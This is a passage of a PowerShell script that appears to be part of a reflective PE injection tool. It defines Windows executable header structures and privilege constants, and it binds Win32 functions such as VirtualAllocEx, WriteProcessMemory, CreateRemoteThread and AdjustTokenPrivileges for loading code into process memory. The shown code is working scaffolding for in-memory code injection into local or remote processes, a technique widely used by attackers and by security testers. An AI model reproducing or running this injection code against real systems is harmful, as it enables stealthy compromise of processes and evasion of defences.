		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
